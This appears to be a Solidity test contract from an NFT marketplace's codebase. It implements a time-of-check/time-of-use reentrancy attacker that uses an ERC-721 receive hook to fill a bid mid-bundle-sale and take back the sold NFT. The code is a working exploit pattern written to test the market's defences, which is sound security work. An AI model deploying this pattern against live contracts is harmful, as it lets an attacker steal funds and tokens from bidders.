// SPDX-License-Identifier: GPL-2.0-only
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "../Market.sol";
import "../MarketMessages.sol";
import "../SignatureChecker.sol";

struct Config {
    Market market;
    Ask bundleAsk;
    Bid bundleBid;
    uint256 token1;
    Ask token2Ask;
    Bid token2Bid;
    bytes token2Signature;
    SignatureKind token2SignatureKind;
}

/// A contract that attempts to execute an time-of-check/time-of-use (TOCTOU)
/// attack by filling a bid while in the process of executing an order to sell
/// a bundle. Scenario:
///
///   - This contract owns `token1` and `token2` and places an ask for `token2`.
///   - This contract also places a bid on the `[token1, token2]` bundle as
///     well as a corresponding ask, which can be executed at any time to just
///     effect a wash sale.
///   - This contract waits for a bid to come in on `token2`.
///   - Some account fills the wash sale bundle orders, transferring `token1`
///     from this contract to itself and thus calling the ERC-721 receive hook.
///   - From the ERC-721 receive hook for `token1`, this contract fills the
///     order for the bid that came in on `token2`. The WETH is transferred to
///     this contract and the NFT is transferred to the buyer.
///   - If vulnerable to the attack, the market continues to execute the bundle
///     order and transfers `token2` *back* to this contract, completing the
///     wash sale but yoinking the NFT away from the original bidder, who is
///     now out of luck.
contract BundleToctouAttacker is IERC721Receiver {
    Market market;
    uint256 token1;
    Ask token2Ask;
    Bid token2Bid;
    bytes token2Signature;
    SignatureKind token2SignatureKind;

    constructor(Config memory _config) {
        _storeConfig(_config);

        _config.market.token().setApprovalForAll(address(_config.market), true);
        require(
            _config.market.weth().approve(
                address(_config.market),
                type(uint256).max
            ),
            "BundleToctouAttacker: IERC20.approve(address,uint256) failed"
        );
        _config.market.setOnChainBidApproval(_config.bundleBid, true);
        _config.market.setOnChainAskApproval(_config.bundleAsk, true);
        _config.market.setOnChainAskApproval(_config.token2Ask, true);
    }

    function onERC721Received(
        address _operator,
        address,
        uint256 _tokenId,
        bytes calldata
    ) external override returns (bytes4) {
        if (_operator == address(market) && _tokenId == token1) {
            market.fillOrder(
                token2Bid,
                token2Signature,
                token2SignatureKind,
                token2Ask,
                abi.encode(address(this)),
                SignatureKind.NO_SIGNATURE
            );
        }
        return IERC721Receiver(this).onERC721Received.selector;
    }

    // Everything below this point just consists of workarounds for the fact
    // that `solc` throws an `UnimplementedFeatureError` if you try to copy a
    // structure containing `Royalty memory[] memory`s into storage. Otherwise,
    // we'd just store declare a `Config config;` in storage and assign to it
    // at the top of the constructor.

    function _storeConfig(Config memory _config) internal {
        market = _config.market;
        token1 = _config.token1;
        _storeAsk(token2Ask, _config.token2Ask);
        _storeBid(token2Bid, _config.token2Bid);
        token2Signature = _config.token2Signature;
        token2SignatureKind = _config.token2SignatureKind;
    }

    function _storeBid(Bid storage _dst, Bid memory _src) internal {
        _dst.nonce = _src.nonce;
        _dst.created = _src.created;
        _dst.deadline = _src.deadline;
        _dst.price = _src.price;
        _dst.bidType = _src.bidType;
        _extendUint256s(_dst.tokenIds, _src.tokenIds);
        _extendUint256s(_dst.traitset, _src.traitset);
        _extendRoyalties(_dst.royalties, _src.royalties);
    }

    function _storeAsk(Ask storage _dst, Ask memory _src) internal {
        _dst.nonce = _src.nonce;
        _dst.created = _src.created;
        _dst.deadline = _src.deadline;
        _dst.price = _src.price;
        _extendUint256s(_dst.tokenIds, _src.tokenIds);
        _extendRoyalties(_dst.royalties, _src.royalties);
        _dst.unwrapWeth = _src.unwrapWeth;
        _dst.authorizedBidder = _src.authorizedBidder;
    }

    function _extendUint256s(uint256[] storage _dst, uint256[] memory _src)
        internal
    {
        for (uint256 _i = 0; _i < _src.length; _i++) {
            _dst.push(_src[_i]);
        }
    }

    function _extendRoyalties(Royalty[] storage _dst, Royalty[] memory _src)
        internal
    {
        for (uint256 _i = 0; _i < _src.length; _i++) {
            _dst.push(_src[_i]);
        }
    }
}
